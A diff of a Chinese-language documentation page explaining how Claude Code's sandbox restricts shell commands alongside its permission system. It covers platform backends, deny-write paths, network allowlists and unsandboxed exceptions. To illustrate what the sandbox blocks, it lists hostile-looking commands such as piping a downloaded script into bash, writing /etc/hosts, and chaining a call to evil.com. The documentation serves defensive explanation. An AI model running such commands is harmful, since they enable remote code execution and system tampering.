@@ -1,215 +1,564 @@
 ---
-title: "沙箱机制 - 权限之外的第二道防线"
-description: "深入 Claude Code 沙箱机制：文件系统隔离、网络限制和资源约束，即使命令通过权限审批，沙箱仍可限制其行为范围。"
-keywords: ["沙箱", "sandbox", "文件隔离", "安全沙箱", "命令隔离"]
+title: "沙箱机制 - 权限系统之外的第二道防线"
+description: "系统性梳理 Claude Code 的沙箱设计：什么时候会进沙箱、什么时候不会、如何与权限系统联动、默认限制了什么、不同平台下行为有什么差异，以及用户在被拦截时会看到什么。"
+keywords: ["沙箱", "sandbox", "权限", "Bash", "PowerShell", "bubblewrap", "sandbox-exec", "纵深防御"]
 ---
 
-## 权限之外的第二道防线
+## 一句话结论
 
-权限系统决定"这条命令能不能执行"，沙箱决定"执行时能做到什么程度"。
+这个项目里的沙箱不是用来替代权限系统，而是用来给 **shell 命令** 再套一层 OS 级能力边界：
 
-即使一条命令通过了权限审批，沙箱仍然可以限制它的行为。两者构成纵深防御的两层：
-- **权限层**（应用级）：在工具调用前检查，决定是否弹窗审批
-- **沙箱层**（OS 级）：在进程级别强制约束，即使 AI 生成了恶意命令也无法突破
+- 权限系统决定：这次工具调用要不要执行
+- 沙箱决定：就算执行了，这个子进程最多能碰到哪些文件、哪些网络目标
 
-## 执行链路：从用户输入到沙箱包裹
+两者组合起来，才构成真正的 Defense-in-Depth。
 
-一条 Bash 命令的完整执行路径如下：
+## 实现分层：仓库里的适配器，加底层运行时
 
+这个项目的“沙箱实现”其实分成两层：
+
+- 这一层仓库自己负责：策略、配置转换、启停判断、命令包裹、清理和权限联动
+- 真正做 OS 级隔离的是外部运行时 `@anthropic-ai/sandbox-runtime`
+
+在 `src/utils/sandbox/sandbox-adapter.ts` 里，可以很清楚地看到这条边界：项目导入 `SandboxManager as BaseSandboxManager`、`SandboxViolationStore` 等运行时对象，然后在外面再包一层符合 Claude Code 自身权限模型的适配器。
+
+底层隔离在不同平台上的落地也不是同一套实现：
+
+- macOS 走 `sandbox-exec`
+- Linux / WSL2 走 `bubblewrap + seccomp`
+- Windows 原生不支持这套 shell 沙箱
+
+所以如果只看这个仓库，容易误以为“沙箱都是它自己做的”。更准确的说法是：这个仓库决定**该不该启、该怎么配、该怎么接进工具链**，真正的 OS 级约束由外部 runtime 执行。
+
+## 它到底解决什么问题
+
+如果只有应用层权限系统，Claude Code 需要在命令执行前尽量判断：
+
+- 这条命令是不是只读
+- 会不会写危险路径
+- 会不会连到外网
+- 会不会通过复合命令、重定向、子进程、解释器脚本绕过检查
+
+这些检查都很有价值，但它们本质上仍然是“执行前推断”。而 shell 命令的真实副作用经常取决于运行时行为：
+
+- `bash script.sh`
+- `python -c "..."`
+- `make`
+- `npm install`
+- 某个命令再启动另一个子进程
+
+沙箱的作用，就是把这些运行时行为的能力范围压缩到一个明确边界内。即使应用层检查漏了，命令也不能随意写系统目录或访问不允许的网络目标。
+
+## 为什么“拦住它”本身就是价值
+
+很多人第一次看到沙箱会直觉觉得：
+
+> 如果连 `/etc/hosts` 这种文件都默认不让我改，那沙箱是不是没什么用？
+
+这个项目的答案正好相反。沙箱不是为了让 `/etc/...` 这种系统路径也能随便改，而是为了把 shell 命令的能力压缩到一个可接受的安全边界里：
+
+- 权限系统负责判断“要不要执行”
+- 沙箱负责限制“就算执行了，最多能做到什么”
+
+`/etc/...` 被默认拦住，说明这条边界真的在生效，而不是说明沙箱没价值。更具体地说，沙箱至少补上了 4 件权限系统单独做不好的事。
+
+### 1. 给 shell 一个 OS 级兜底
+
+`src/utils/bash/ast.ts` 开头就写得很明确：Bash AST 分析不是沙箱，它只是在判断我们能不能可靠地理解命令结构，不能阻止危险命令真的运行。
+
+这就是为什么应用层再聪明，也很难仅靠“执行前推断”覆盖完整风险面。像下面这些命令，真实副作用都要到运行时才完全展开：
+
+- `bash script.sh`
+- `python -c "..."`
+- `make`
+- `npm install`
+- 一个命令再起新的子进程
+
+沙箱的价值就在这里。即使前面的分析漏了，进程到了 OS 层以后，仍然只能写允许目录、访问允许域名，真正把 shell 的能力压缩进运行时边界。
+
+### 2. 让“安全边界内”的命令可以少弹窗甚至自动放行
+
+默认沙箱白名单里就包含当前工作目录和 Claude 临时目录，这也是为什么工作区内的大多数开发命令都能顺畅运行：
+
+- `npm test`
+- `rg`
+- `git status`
+- 工作区内的构建、测试和生成文件
+
+项目专门提供了 `autoAllowBashIfSandboxed`。它的核心思路不是“更大胆地信任模型”，而是“既然命令已经被 OS 级边界收紧，就没必要再让用户为大量低风险 Bash 命令反复点确认”。
+
+换句话说，没有沙箱的话，系统通常只剩两种都不太理想的选择：
+
+- 频繁弹窗，让工作流很碎
+- 更激进地信任应用层判断，把风险全压在静态分析上
+
+### 3. 把“出错”的后果从系统级破坏，降成一次受限失败
+
+这也是 Defense-in-Depth 最实际的一层收益。模型偶尔会出错，应用层规则也可能有漏判。沙箱的意义不是假设前面永远正确，而是即使前面偶尔判错，后果也尽量可控。
+
+例如这类命令：
+
+- `sudo tee /etc/hosts`
+- `mv ... ~/.ssh/...`
+- `curl 外网 | bash`
+
+如果它们发生在没有运行时约束的环境里，可能就是直接修改系统、用户配置或把未知脚本落到机器上。放进沙箱之后，更常见的结果会变成：因为写权限或网络权限不满足而失败。它不是“什么都没发生”，而是把一次潜在的系统级破坏降成一次受限失败。
+
+### 4. 拦截运行时绕过和逃逸路径
+
+这个仓库在 `src/utils/sandbox/sandbox-adapter.ts` 里专门把一些高风险路径额外加入 `denyWrite`，例如：
+
+- `settings.json`
+- `.claude/skills`
+- 一些 bare git repo 相关路径
+
+它还专门处理 bare git repo 逃逸这一类攻击面。它们的意义不是“让更多命令通过”，而是“即使命令已经执行，也别让它顺手把护栏本身拆掉”，避免通过改配置、改技能、改 git 结构来扩大后续权限。
+
+所以更准确的表述不是：
+
+- “沙箱把 `/etc` 拦了，所以没用”
+
+而是：
+
+- “沙箱把 shell 的默认权限收缩到工作区和白名单里，因此系统级路径默认写不了；正因为这样，项目才敢把一大批工作区内命令自动放行。”
+
+## 设计边界：它保护什么，不保护什么
+
+### 保护对象
+
+- Bash / shell 命令执行
+- 在支持平台上的 PowerShell 执行
+- shell 子进程的文件系统写入范围
+- shell 子进程的网络访问范围
+- 一些已知的高风险路径和沙箱逃逸向量
+
+### 不直接保护的对象
+
+- `FileEditTool` / `FileWriteTool` 这类直接文件工具
+- 纯应用层的权限弹窗和规则匹配
+- Bash AST 解析本身
+
+尤其要注意一点：Bash AST 分析不是沙箱。源码自己写得很明确，它只回答“我们能不能可信地提取 argv 结构”，并不负责阻止危险命令真正运行。
+
+## 哪些场景会走沙箱
+
+### 1. 启动阶段先判断“沙箱能不能用”
+
+沙箱不是等到第一条命令执行时才临时判断的。REPL / CLI 启动时，就会先检查当前环境是否真的具备沙箱条件。核心判断包括：
+
+1. 当前平台是否受底层 runtime 支持
+2. 依赖是否齐全
+3. `sandbox.enabled` 是否打开
+4. 当前平台是否落在 `enabledPlatforms` 范围内
+
+如果用户显式开启了沙箱，但当前环境不满足条件，启动期会先给出 warning；如果同时配置了 `sandbox.failIfUnavailable`，则会直接拒绝启动，而不是悄悄降级成无沙箱模式。
+
+另外，启动时不只是“看一眼能不能用”，而是真的会调用初始化流程，把当前设置转换成 runtime 配置并交给底层 `BaseSandboxManager.initialize(...)`。后续如果设置变化，还会通过 `updateConfig(...)` 热更新，而不是要求重启整个会话。
+
+### 2. BashTool 默认会走
+
+只要满足下面条件，Bash 命令默认会进入沙箱：
+
+1. 当前平台支持沙箱
+2. 沙箱依赖齐全
+3. `sandbox.enabled` 打开
+4. 当前平台在 `enabledPlatforms` 范围内
+5. 这条命令没有被显式排除
+6. 这次调用没有被允许以 `dangerouslyDisableSandbox` 绕过
+
+对应入口在 `src/tools/BashTool/shouldUseSandbox.ts` 和 `src/utils/sandbox/sandbox-adapter.ts`。
+
+### 3. PowerShell 只在支持平台上走
+
+PowerShell 的处理要更细一点：
+
+- Linux / macOS / WSL2：可以走沙箱
+- Windows 原生：不支持沙箱，直接返回 `shouldUseSandbox: false`
+
+也就是说，Windows 原生上的 PowerShell 只能依赖权限系统，不会有 OS 级沙箱兜底。
+
+### 4. Hook 命令会复用“网络专用沙箱”
+
+Hook 不是完整复用 Bash 那套文件系统限制，而是额外套了一层 **network-only sandbox**：
+
+- 重点拦网络访问
+- 文件系统不额外收紧到 Bash 那个程度
+
+这是因为 Hook 往往不是模型直接下发的 Bash 工具调用，而是系统/插件的外部扩展点。
+
+## 哪些场景不会走沙箱
+
+### 1. FileEditTool / FileWriteTool
+
+这类工具不是靠 shell 修改文件，而是直接在应用层做文件 I/O，所以它们不通过 `Shell.exec()`，自然也不会被 `wrapWithSandbox()` 包裹。
+
+它们走的是另一条链路：
+
+- `checkWritePermissionForTool()`
+- `checkPathSafetyForAutoEdit()`
+- 工作目录检查
+- allow/ask/deny 规则
+
+因此：
+
+- “shell 改 `/etc/hosts`”通常是沙箱在 OS 层拦
+- “FileEdit 改 `/etc/hosts`”通常是权限系统在应用层拦
+
+### 2. 明确排除的命令
+
+如果命中 `sandbox.excludedCommands`，这条命令会直接跳过沙箱。
+
+支持三类模式：
+
+- 精确匹配
+- 前缀匹配
+- 通配符匹配
+
+### 3. 允许 unsandboxed fallback 的命令
+
+如果：
+
+- 这次调用显式设置了 `dangerouslyDisableSandbox: true`
+- 并且策略允许 `allowUnsandboxedCommands`
+
+那它也可以不进沙箱。
+
+这个设计是有意保留的，但命名也故意写得很重：`dangerouslyDisableSandbox`，提醒这是例外路径，不应当成为默认习惯。
+
+## 完整执行链路
+
+可以把整个过程拆成两段来看：启动期先把沙箱准备好，命令期再决定“这条命令要不要进去”。
+
+### 启动期链路
+
+```text
+REPL / CLI 启动
+  -> isSandboxingEnabled()
+  -> convertToSandboxRuntimeConfig(settings)
+  -> BaseSandboxManager.initialize(runtimeConfig, callback)
+  -> 设置变化时 BaseSandboxManager.updateConfig(newConfig)
 ```
-用户输入 → BashTool.call()
-         → shouldUseSandbox(input) ─── 是否需要沙箱？
-         → Shell.exec(command, { shouldUseSandbox })
-         → SandboxManager.wrapWithSandbox(command)
-         → spawn(wrapped_command)  ─── 实际进程创建
+
+这一段回答的是：当前会话里有没有一个可用、已初始化、能处理网络授权回调的沙箱 runtime。
+
+### 命令期链路
+
+典型 Bash 执行链路如下：
+
+```text
+用户请求
+  -> BashTool.checkPermissions()
+  -> shouldUseSandbox(input)
+  -> Shell.exec(command, { shouldUseSandbox: true/false })
+  -> SandboxManager.wrapWithSandbox(...)
+  -> spawn(wrapped command)
+  -> 运行结束后 cleanupAfterCommand()
 ```
 
-关键判定发生在 `shouldUseSandbox()`（`src/tools/BashTool/shouldUseSandbox.ts`），它执行以下检查：
+这里真正把命令“包进沙箱”的关键点是 `Shell.exec()`。它会在真正 `spawn(...)` 之前调用 `SandboxManager.wrapWithSandbox(...)`，把原始命令改写成底层 runtime 可执行的沙箱命令串。命令结束后如果本次是 sandboxed execution，再调用 `cleanupAfterCommand()` 清理运行时残留。
 
-1. **全局开关**：`SandboxManager.isSandboxingEnabled()` — 检查平台支持 + 依赖完整性 + 用户设置
-2. **显式跳过**：如果 `dangerouslyDisableSandbox: true` 且策略允许（`allowUnsandboxedCommands`），则不走沙箱
-3. **排除列表**：用户可在 `settings.json` 中配置 `sandbox.excludedCommands`，匹配的命令跳过沙箱
-4. **默认行为**：以上条件都不满足时，**进入沙箱**
+其中有两个容易混淆的判定点：
 
-## `shouldUseSandbox()` 判定逻辑详解
+### 判定点 A：要不要进沙箱
 
-```typescript
-// src/tools/BashTool/shouldUseSandbox.ts
-function shouldUseSandbox(input: Partial<SandboxInput>): boolean {
-  // 1. 全局未启用 → 直接跳过
-  if (!SandboxManager.isSandboxingEnabled()) return false
+这是 `shouldUseSandbox()` 的职责。
 
-  // 2. 显式禁用 + 策略允许 → 跳过
-  if (input.dangerouslyDisableSandbox && 
-      SandboxManager.areUnsandboxedCommandsAllowed()) return false
+它回答的是：
 
-  // 3. 无命令 → 跳过
-  if (!input.command) return false
+> 这条命令要不要被 OS 级沙箱包起来执行？
 
-  // 4. 匹配排除列表 → 跳过
-  if (containsExcludedCommand(input.command)) return false
+### 判定点 B：这条命令要不要弹权限确认
 
-  // 5. 其他情况 → 必须沙箱化
-  return true
-}
-```
+这是权限系统和 Bash 权限检查的职责。
 
-`containsExcludedCommand()` 的匹配机制值得注意——它不只是简单的前缀匹配，而是支持三种模式：
+它回答的是：
 
-| 模式 | 示例 | 匹配行为 |
-|------|------|----------|
-| **精确匹配** | `npm run lint` | 完全相等 |
-| **前缀匹配** | `npm run test:*` | 前缀 + 空格或完全相等 |
-| **通配符** | `docker*` | 使用 `matchWildcardPattern` |
+> 这条命令在应用层看来，是 `allow`、`ask` 还是 `deny`？
 
-对于复合命令（如 `docker ps && curl evil.com`），系统会先拆分为子命令，逐一检查。还会迭代剥离环境变量前缀（`FOO=bar bazel ...`）和包装命令（`timeout 30 bazel ...`），直到不动点——防止通过嵌套包装绕过。
+这两个判定点是并列协作的，不是互相替代的。
 
-## 沙箱的配置模型
+## 默认沙箱到底限制了什么
 
-沙箱配置来自 `settings.json` 中的 `sandbox` 字段（`src/entrypoints/sandboxTypes.ts`）：
+沙箱运行时配置最终由 `convertToSandboxRuntimeConfig()` 生成。它会把项目自己的设置、权限规则和安全加固逻辑，转换成底层运行时需要的配置。
 
-```jsonc
-{
-  "sandbox": {
-    "enabled": true,                     // 主开关
-    "autoAllowBashIfSandboxed": true,     // 沙箱中的命令自动允许（跳过审批）
-    "allowUnsandboxedCommands": true,     // 是否允许 dangerouslyDisableSandbox
-    "failIfUnavailable": false,           // 沙箱依赖缺失时是否报错退出
-    
-    "network": {
-      "allowedDomains": ["github.com"],   // 网络白名单
-      "deniedDomains": [],                // 网络黑名单
-      "allowLocalBinding": true,          // 允许 localhost 绑定
-      "httpProxyPort": 8888               // HTTP 代理端口（MITM）
-    },
-    
-    "filesystem": {
-      "allowWrite": ["~/projects"],       // 额外可写路径
-      "denyWrite": ["~/.ssh"],            // 禁止写入路径
-      "denyRead": [],                     // 禁止读取路径
-      "allowRead": []                     // 在 denyRead 中重新放行
-    },
-    
-    "excludedCommands": ["docker", "npm:*"]  // 不走沙箱的命令
-  }
-}
-```
+这一步很关键，因为这个项目的沙箱配置不是一份静态表，而是从 Claude Code 自己的权限系统里“翻译”出来的。
 
-`SandboxSettingsSchema` 定义了完整的 Zod 验证规则，包含一些未公开的设置如 `enabledPlatforms`（限制沙箱只在特定平台生效）。
+### 这些限制是怎么从权限系统推导出来的
 
-## 平台实现差异
+- `WebFetch(domain:...)` 和 `sandbox.network.allowedDomains` 会被合并成网络白名单
+- `Edit(...)` / `Read(...)` 这类权限规则会被翻译成文件系统读写限制
+- `sandbox.filesystem.allowWrite` / `allowRead` / `denyWrite` / `denyRead` 会继续叠加到最终 runtime 配置上
 
-### macOS：sandbox-exec（Seatbelt）
+也就是说，沙箱不是独立维护另一套完全平行的安全策略，而是把“Claude 认为哪些路径或域名应该被允许”落地成 OS 级约束。
 
-macOS 使用 Apple 的 Seatbelt 沙箱（`sandbox-exec` 命令），这是 macOS 原生的进程隔离机制。
+### 文件系统默认写入范围
 
-执行流程：
-1. `SandboxManager.wrapWithSandbox()` 调用 `@anthropic-ai/sandbox-runtime` 的 `BaseSandboxManager`
-2. 运行时生成 Seatbelt profile（基于配置中的网络/文件系统规则）
-3. 通过 `sandbox-exec -p <profile> -- <command>` 包裹原始命令
-4. Seatbelt 在内核级别强制执行约束
+默认 `allowWrite` 只有两类：
 
-网络隔离的实现方式：
-- 通过代理端口拦截 HTTP/HTTPS 请求
-- 域名白名单/黑名单在代理层过滤
-- Unix socket 可单独配置允许路径
+- 当前工作目录 `.`
+- Claude 的临时目录
 
-### Linux：bubblewrap（bwrap）+ seccomp
+这意味着：
 
-Linux 使用 `bubblewrap`（bwrap）创建命名空间隔离，配合 seccomp 过滤系统调用：
+- 工作区内的构建、测试、生成临时文件通常能正常运行
+- 根路径如 `/etc/...`、`/usr/...`、`/var/...` 默认不在写白名单里
 
-依赖项（`apt install`）：
-| 包 | 作用 |
-|----|------|
-| `bubblewrap` | 创建 mount/PID/network 命名空间 |
-| `socat` | 网络代理（HTTP/SOCKS） |
-| `libseccomp` / seccomp filter | 过滤 Unix socket 系统调用 |
+### 文件系统额外写入来源
 
-bwrap 的实现差异：
-- **不支持 glob 路径模式**（macOS 的 Seatbelt 支持）— Linux 上带 glob 的权限规则会触发警告
-- 执行后会在当前目录留下 0 字节的 mount-point 文件（如 `.bashrc`），需要 `cleanupAfterCommand()` 清理
-- seccomp 无法按路径过滤 Unix socket（只能全允许或全拒绝），与 macOS 的按路径放行形成差异
+额外允许写入的路径，主要来自这些来源：
 
-### 平台支持矩阵
+- `sandbox.filesystem.allowWrite`
+- `Edit(...)` 规则推导出的路径
+- `/add-dir` 或 `--add-dir` 增加的目录
+- git worktree 主仓库所需路径
 
-| 特性 | macOS | Linux | WSL |
-|------|-------|-------|-----|
-| 沙箱引擎 | sandbox-exec (Seatbelt) | bubblewrap + seccomp | 仅 WSL2 |
-| 文件 glob | ✅ 完整支持 | ⚠️ 仅 `/**` 后缀 | 同 Linux |
-| 网络 Unix socket 按路径 | ✅ | ❌ | ❌ |
-| 依赖检查 | ripgrep | bwrap + socat + ripgrep + seccomp | 同 Linux |
+这里还有一个很容易漏掉的细节：适配层会专门处理 worktree 主仓库和 bare git repo 这种仓库级特殊路径，避免在隔离后把正常开发流程误伤，或者反过来留下逃逸面。
 
-## 沙箱初始化流程
+### 强制 deny 的路径
 
-```
-REPL/SDK 启动
-  → main.tsx → init.ts
-  → SandboxManager.initialize(sandboxAskCallback)
-    → detectWorktreeMainRepoPath()     // 检测 git worktree，放行主仓库 .git
-    → convertToSandboxRuntimeConfig()  // 构建 SandboxRuntimeConfig
-    → BaseSandboxManager.initialize()  // 启动底层运行时
-    → settingsChangeDetector.subscribe() // 订阅设置变更，动态更新配置
-```
+即使有别的配置，项目还会额外加固一些高风险路径，例如：
 
-`convertToSandboxRuntimeConfig()`（`src/utils/sandbox/sandbox-adapter.ts`）完成从用户设置到运行时配置的转换：
+- settings 文件
+- `.claude/skills`
+- 一些 bare git repo 相关路径
 
-1. **网络规则**：从 `WebFetch(domain:...)` 权限规则提取域名 → `allowedDomains`
-2. **文件系统规则**：从 `Edit(...)` / `Read(...)` 权限规则提取路径 → `allowWrite` / `denyWrite` / `denyRead`
-3. **安全加固**：
-   - 自动将项目目录加入 `allowWrite`
-   - 自动将 `settings.json` 路径加入 `denyWrite`（防止沙箱逃逸）
-   - 自动将 `.claude/skills` 加入 `denyWrite`（防止技能注入）
-   - 检测 bare git repo 攻击向量，对 `HEAD`/`objects`/`refs` 做保护
+这样做的原因是：这些路径一旦可写，攻击者可能反过来修改 Claude Code 自己的配置、技能或 git 行为，从而扩大权限。
 
-## `dangerouslyDisableSandbox` 的设计权衡
+### 网络限制
 
-这个参数的命名本身就传达了设计意图——它不是"关闭沙箱"，而是"**危险地禁用沙箱**"。
+网络白名单来自两部分：
 
-双重保险机制：
-1. **调用侧**：模型在 BashTool 的 `inputSchema` 中可以设置 `dangerouslyDisableSandbox: true`
-2. **策略侧**：管理员可通过 `allowUnsandboxedCommands: false` 完全禁止此参数（企业部署场景）
+- `sandbox.network.allowedDomains`
+- `WebFetch(domain:...)` 这类权限规则
 
-```typescript
-// 即使 AI 请求了 dangerouslyDisableSandbox，策略层仍可覆盖
-if (input.dangerouslyDisableSandbox && 
-    SandboxManager.areUnsandboxedCommandsAllowed()) {
-  return false  // 只有策略允许时才真正跳过沙箱
-}
-```
+被允许的域名会进入沙箱网络配置；不在白名单里的访问，在运行时会被拦截或触发额外的网络授权流程。
 
-`autoAllowBashIfSandboxed` 进一步补充了这个模型：当启用时，**在沙箱中的命令自动获得执行许可**，无需逐条审批。这基于一个信任假设——如果 OS 级沙箱已经限制了命令的能力，那么应用层的逐条审批就变得多余。
+## `autoAllowBashIfSandboxed` 的真实意义
 
-## 沙箱违规处理
+这是沙箱设计里最值得注意的开关之一。
 
-当命令尝试违反沙箱约束时：
+它表达的是这样一个信任假设：
 
-1. 运行时捕获违规事件（文件/网络访问被拒绝）
-2. `SandboxManager.annotateStderrWithSandboxFailures()` 在输出中注入 `<sandbox_violations>` 标签
-3. UI 层通过 `removeSandboxViolationTags()` 清理显示
-4. 违规事件通过 `SandboxViolationStore` 持久化，可用于审计
+> 如果命令已经被 OS 级沙箱约束在安全边界内，那么应用层就没有必要再对大量低风险 Bash 命令逐条弹确认框。
 
-## 完整执行链路示例
+因此，当这个开关开启时：
 
-以 `npm install` 为例：
+- 命令会先检查显式 `deny` / `ask` 规则
+- 如果没有命中这些硬规则
+- 且命令确实会在沙箱里执行
+- 那么 BashTool 可以直接自动允许它运行
 
-```
-1. 用户在 REPL 中输入 → Claude 决定调用 BashTool
-2. BashTool.validateInput() → 通过
-3. BashTool.checkPermissions() → 检查权限规则
-   ├── autoAllowBashIfSandboxed = true 且沙箱可用 → 自动允许
-   └── 否则 → 弹窗请用户确认
-4. BashTool.call() → runShellCommand()
-5. shouldUseSandbox({ command: "npm install" })
-   ├── SandboxManager.isSandboxingEnabled() → true
-   ├── dangerouslyDisableSandbox → undefined
-   └── containsExcludedCommand() → false（除非用户配置了排除 npm）
-   → 结果: true，需要沙箱
-6. Shell.exec() → SandboxManager.wrapWithSandbox("npm install")
-   ├── macOS: sandbox-exec -p <generated-profile> -- bash -c 'npm install'
-   └── Linux: bwrap ... bash -c 'npm install'
-7. spawn(wrapped_command) → 子进程在沙箱内执行
-8. 执行完成 → SandboxManager.cleanupAfterCommand()
-   ├── 清理 bwrap 残留文件（Linux）
-   └── scrubBareGitRepoFiles()（安全清理）
-9. 结果返回给 Claude → 展示给用户
-```
+这里还有一个边界条件特别值得写清楚：它只对“真正会进沙箱的命令”生效。像这些情况，仍然不能直接吃到这个 shortcut：
+
+- 命中了 `excludedCommands`
+- 显式使用了 `dangerouslyDisableSandbox: true`
+- 当前平台根本不支持沙箱
+
+这些命令依然要遵守正常的 `ask` 规则，因为它们没有拿到 OS 级约束带来的那层安全兜底。
+
+这也是沙箱存在的一个核心产品价值：不是让更多危险操作通过，而是让更多**受限范围内的常规命令**可以无感运行。
+
+## 为什么“沙箱把 `/etc` 拦了”反而说明它有用
+
+前面的“四个核心价值”解释的是原理，这里把结论再落回最常见的直觉疑问上：为什么一个默认不让你写 `/etc` 的系统，反而更值得信任？
+
+因为 Claude Code 日常最常跑的不是系统管理命令，而是开发命令。例如：
+
+- `npm test`
+- `npm install`
+- `cargo build`
+- `pytest`
+- `rg`
+- `git status`
+
+这些命令本来就应该只在工作区和少量临时目录里活动。沙箱把 shell 的默认能力收缩到这个范围后，项目才敢在应用层减少弹窗、启用 `autoAllowBashIfSandboxed`、提高自动化程度。
+
+所以这个问题的正确落点不是“它为什么不帮我改 `/etc`”，而是“它能不能在不碰 `/etc` 的前提下，让大量正常开发命令更安全、更顺滑地运行”。从这个角度看，`/etc` 默认写不了并不是缺点，而是整个自动化体验成立的前提。
+
+## 平台差异
+
+### macOS
+
+- 底层使用 `sandbox-exec`
+- 路径和网络规则通过 Seatbelt profile 落地
+- 属于原生 OS 级进程隔离
+
+### Linux
+
+- 底层使用 `bubblewrap + seccomp`
+- 会建立 mount / PID / network 等隔离
+- Linux 上对 glob 路径的支持比 macOS 弱一些
+- 某些运行后残留需要在 `cleanupAfterCommand()` 中清理
+
+### WSL
+
+- 只支持 WSL2
+- WSL1 视为不支持平台
+
+### Windows 原生
+
+- 原生 PowerShell/Bash 不支持这个沙箱体系
+- 因此只能依赖权限系统和工具级检查
+
+这也是为什么你前面问“改 C 盘文件会不会走沙箱”时，答案会分成：
+
+- Windows 原生：通常不走
+- Linux/macOS/WSL2：shell 才可能走
+
+## 工作区内外：应用层与沙箱层如何配合
+
+### 工作区内路径
+
+工作区内路径通常有两层保护：
+
+1. 应用层权限检查
+2. 沙箱默认允许写当前工作目录
+
+这使得“工作区内构建/测试/格式化/生成文件”成为最顺滑的一条路径。
+
+### 工作区外路径
+
+工作区外路径则更严格：
+
+- 应用层通常会视为高风险，要求确认或阻止
+- 即使应用层允许，如果不在沙箱白名单里，运行时也会失败
+
+这就形成了双保险。
+
+### Linux 根路径 `/etc/...`
+
+对于 Linux 上的根路径文件，通常会出现两种情况：
+
+- **shell 路径**：命令会进沙箱，但沙箱默认没有 `/etc` 写权限，所以运行时被拦
+- **文件工具路径**：不走沙箱，而是在应用层直接被文件权限检查拦住
+
+## 用户真的会看到什么
+
+被拦截并不是同一种体验，至少有三类。
+
+### 1. 执行前的权限确认
+
+如果应用层在执行前就判定为 `ask`，用户会看到标准权限对话框：
+
+- Bash 权限确认
+- FileEdit / FileWrite 权限确认
+- 其他工具自己的权限确认 UI
+
+这种提示发生在命令还没真正运行之前。
+
+### 2. 执行中的沙箱违规
+
+如果命令已经进入沙箱，运行时才触发违规：
+
+- 命令会失败
+- stderr 会被附加 `<sandbox_violations>` 标签供模型理解
+- UI 会清理这些标签再显示给用户
+- 同时 `SandboxViolationStore` 会记录违规事件
+
+这意味着用户通常能看到：
+
+- 命令失败本身
+- 以及“最近有多少次 sandbox blocked”之类的界面提示
+
+### 3. 网络越界请求
+
+网络是个特例。
+
+当沙箱外的 host 访问需要额外确认时，项目会弹出一个专门的网络授权对话框，例如：
+
+- `Network request outside of sandbox`
+
+这里和文件系统运行时拦截不同，它有明确的交互式授权 UI。
+
+## 为什么文件系统越界通常不弹“再放行一次”
+
+这是一个非常有意的设计选择。
+
+对文件系统来说，项目更倾向于：
+
+- 执行前在应用层 ask
+- 或者执行后让命令直接因沙箱失败
+
+而不是在运行到一半时再弹出一个“是否允许写这个系统路径”的新对话框。
+
+这样做的好处是：
+
+- 边界更稳定
+- 用户心智更清晰
+- 不容易把 shell 运行时逐步升级成越来越宽松的环境
+
+网络访问则更适合做按 host 的临时授权，因此单独做了授权对话框。
+
+## 常见误区
+
+### 误区 1：沙箱会保护所有文件修改
+
+不是。它主要保护 **shell 子进程**。
+
+直接文件编辑工具走的是应用层权限系统，不是 shell 沙箱。
+
+### 误区 2：只要启用了沙箱，就不会再需要权限系统
+
+不是。沙箱只限制进程能力，不负责解释用户意图、路径安全语义、工具模式、审批体验。
+
+项目之所以还保留复杂的 `allow / ask / deny` 体系，就是因为两者职责不同。
+
+### 误区 3：如果某个危险操作被沙箱拦住，就说明应用层检查没价值
+
+不是。应用层检查的价值在于：
+
+- 更早提示
+- 更好的用户体验
+- 更细的语义判断
+- 对不走 shell 的工具同样生效
+
+而沙箱负责的是最终兜底。
+
+## 推荐的阅读路径
+
+如果你想继续顺着源码深入，推荐按下面顺序看：
+
+1. `src/tools/BashTool/shouldUseSandbox.ts`
+2. `src/utils/Shell.ts`
+3. `src/utils/sandbox/sandbox-adapter.ts`
+4. `src/utils/permissions/permissions.ts`
+5. `src/tools/BashTool/bashPermissions.ts`
+6. `src/utils/permissions/pathValidation.ts`
+7. `src/utils/permissions/filesystem.ts`
+
+按这条线读，会更容易把“权限系统”和“沙箱系统”在脑中拆开。
+
+## FAQ
+
+### Q1：Linux 下 `echo hi > /etc/hosts` 会怎样？
+
+如果是 BashTool：
+
+- 通常会进沙箱
+- 默认沙箱不允许写 `/etc`
+- 所以命令会在运行时失败
+
+如果是 FileEditTool：
+
+- 不进沙箱
+- 通常会在应用层文件权限检查里先被拦下
+
+### Q2：Windows 下改 `C:\Windows\System32\drivers\etc\hosts` 会怎样？
+
+在 Windows 原生环境里，通常没有这套 shell 沙箱兜底，所以主要依赖应用层权限系统和工具自己的检查逻辑。
+
+### Q3：既然沙箱这么强，为什么还保留 `dangerouslyDisableSandbox`？
+
+因为有些真实开发任务确实需要越过默认边界，例如：
+
+- 访问未加入白名单的工具链目录
+- 调试系统级环境
+- 做管理员明确允许的例外操作
+
+但项目把这个入口做得非常显眼，也允许管理员通过策略直接禁掉，避免它变成默认路径。
+
+### Q4：什么时候最能感受到沙箱的价值？
+
+当你开启 `autoAllowBashIfSandboxed` 时最明显。
+
+这时大量工作区内命令可以少弹窗甚至不弹窗，但即使模型偶尔给出过界命令，系统级写入和网络能力仍然被边界限制住。
